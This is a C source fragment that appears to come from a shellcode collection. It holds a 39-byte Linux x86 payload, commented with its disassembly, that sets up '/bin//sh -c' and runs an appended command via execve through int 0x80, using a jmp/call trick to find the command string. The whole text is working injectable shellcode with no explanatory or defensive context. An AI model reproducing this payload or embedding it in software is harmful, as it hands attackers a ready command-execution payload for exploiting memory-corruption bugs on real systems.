
#define CMD_SIZE 39

char CMD[] = {
  /* 0000 */ "\x31\xc0"             /* xor eax, eax    */
  /* 0002 */ "\x99"                 /* cdq             */
  /* 0003 */ "\x50"                 /* push eax        */
  /* 0004 */ "\x68\x2f\x2f\x73\x68" /* push 0x68732f2f */
  /* 0009 */ "\x68\x2f\x62\x69\x6e" /* push 0x6e69622f */
  /* 000E */ "\x89\xe3"             /* mov ebx, esp    */
  /* 0010 */ "\x50"                 /* push eax        */
  /* 0011 */ "\x66\x68\x2d\x63"     /* push 0x632d     */
  /* 0015 */ "\x89\xe7"             /* mov edi, esp    */
  /* 0017 */ "\x50"                 /* push eax        */
  /* 0018 */ "\xeb\x08"             /* jmp 0x22        */
  /* 001A */ "\x57"                 /* push edi        */
  /* 001B */ "\x53"                 /* push ebx        */
  /* 001C */ "\x89\xe1"             /* mov ecx, esp    */
  /* 001E */ "\xb0\x0b"             /* mov al, 0xb     */
  /* 0020 */ "\xcd\x80"             /* int 0x80        */
  /* 0022 */ "\xe8\xf3\xff\xff\xff" /* call 0x1a       */
};